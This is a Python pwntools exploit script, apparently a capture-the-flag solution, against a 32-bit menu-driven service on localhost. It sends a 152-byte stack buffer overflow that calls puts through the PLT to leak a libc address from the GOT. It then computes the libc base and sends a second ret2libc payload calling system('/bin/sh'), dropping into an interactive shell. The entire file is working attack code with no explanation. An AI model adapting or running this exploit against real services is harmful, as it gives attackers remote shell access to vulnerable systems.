from pwn import *
import sys

def exploit(r,libc):
    puts_plt = 0x08048440
    puts_got = 0x0804b018 
    main = 0x08048d69
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    r.send("3")
    r.send("\x0A")
    print(r.recvline())
    payload = "a"*152
    payload += p32(puts_plt)
    payload += p32(main)
    payload += p32(puts_got)
    r.sendline(payload)
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    r.sendline("1")
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    r.sendline("2")
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    r.sendline("3")
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    # print(r.recvline())
    # print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    puts_leak = u32(r.recvline()[:4])
    log.info('Puts leak: {}'.format(hex(puts_leak)))
    puts_offset = libc.symbols['puts']
    system_offset = libc.symbols['system']
    exit_offset = libc.symbols['exit']
    binsh_offset = next(libc.search('/bin/sh\x00'))
    libc_base = puts_leak - puts_offset 
    system_addr = libc_base + system_offset
    binsh_addr = libc_base + binsh_offset
    exit_addr = libc_base + exit_offset
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    r.send("3")
    r.send("\x0A")
    print(r.recvline())
    payload = ""
    payload += "A"*152
    payload += p32(system_addr)
    payload += p32(exit_addr)
    payload += p32(binsh_addr)
    r.sendline(payload)
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    r.sendline("1")
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    r.send("4")
    r.send("\x0A")
    r.interactive()
    return
if __name__ == "__main__":
    r = connect("localhost",3333)
    libc = ELF('./libc6-i386_2.23-0ubuntu11_amd64.so')
    exploit(r,libc)
